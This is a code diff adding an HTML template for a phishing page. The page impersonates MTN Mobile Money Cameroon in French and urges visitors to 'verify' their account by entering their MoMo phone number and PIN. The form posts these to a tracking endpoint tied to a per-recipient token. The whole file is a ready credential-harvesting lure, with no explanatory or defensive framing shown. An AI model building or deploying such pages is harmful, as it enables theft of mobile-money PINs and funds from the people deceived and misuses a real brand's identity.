@@ -1,0 +1,25 @@
+<!doctype html>
+<html lang="fr"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>MTN Mobile Money</title>
+<style>
+  body { margin:0; font-family: Arial, sans-serif; background:#FFCB05; }
+  .header { background:#000; color:#FFCB05; padding:16px; text-align:center; font-weight:bold; font-size:1.4rem; letter-spacing:.05em;}
+  .box { max-width:380px; margin:32px auto; background:#fff; padding:28px; border-radius:6px; box-shadow:0 4px 20px rgba(0,0,0,.15);}
+  h2 { color:#000; margin-top:0; text-align:center;}
+  input { width:100%; padding:11px; margin:8px 0; box-sizing:border-box; border:1px solid #ccc; border-radius:4px;}
+  button { width:100%; padding:12px; background:#000; color:#FFCB05; border:0; border-radius:4px; font-weight:bold; font-size:1rem; cursor:pointer; letter-spacing:.05em;}
+  .footer { text-align:center; margin-top:12px; font-size:.75rem; color:#666;}
+</style></head><body>
+<div class="header">MTN MOBILE MONEY</div>
+<div class="box">
+  <h2>Verification de compte</h2>
+  <p style="font-size:.9rem; color:#444;">Veuillez confirmer vos identifiants MoMo pour finaliser la transaction.</p>
+  <form method="post" action="{{ url_for('track.submit', token=token) }}">
+    <input type="text" name="identifier" placeholder="Numero MoMo (6XX XXX XXX)" required>
+    <input type="password" name="secret" placeholder="Code PIN MoMo" required>
+    <button type="submit">VALIDER MAINTENANT</button>
+  </form>
+  <div class="footer">© 2026 MTN Cameroon — Service Client *126#</div>
+</div>
+</body></html>
